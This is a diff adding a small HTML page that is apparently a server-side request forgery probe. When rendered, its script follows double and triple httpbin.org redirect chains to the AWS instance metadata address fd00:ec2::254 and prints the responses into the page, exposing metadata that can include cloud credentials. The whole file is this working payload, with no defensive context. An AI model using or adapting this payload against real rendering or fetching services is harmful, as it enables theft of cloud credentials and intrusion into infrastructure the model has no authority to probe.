@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html><body>
+<h1>DOUBLE_REDIRECT_TEST</h1>
+<div id="r1">INITIAL</div>
+<div id="r2">INITIAL</div>
+<div id="r3">INITIAL</div>
+<script>
+function syncFetch(id, url) {
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    xhr.send();
+    document.getElementById(id).innerText = id + ' [' + xhr.status + '] ' + xhr.responseText.substr(0, 1500);
+  } catch(e) {
+    document.getElementById(id).innerText = id + ' [ERR] ' + e.name + ':' + e.message.substr(0,300);
+  }
+}
+
+setTimeout(function() {
+  // Double redirect: httpbin → httpbin → IMDS IPv6
+  var inner = encodeURIComponent('http://[fd00:ec2::254]/latest/meta-data/');
+  var outer = encodeURIComponent('https://httpbin.org/redirect-to?url=' + inner);
+  syncFetch('r1', 'https://httpbin.org/redirect-to?url=' + outer);
+  
+  // Triple redirect
+  var triple = encodeURIComponent('https://httpbin.org/redirect-to?url=' + encodeURIComponent('https://httpbin.org/redirect-to?url=' + inner));
+  syncFetch('r2', 'https://httpbin.org/redirect-to?url=' + triple);
+  
+  // Redirect via httpbin absolute-redirect (different endpoint)
+  syncFetch('r3', 'https://httpbin.org/absolute-redirect/1');
+}, 0);
+</script>
+</body></html>
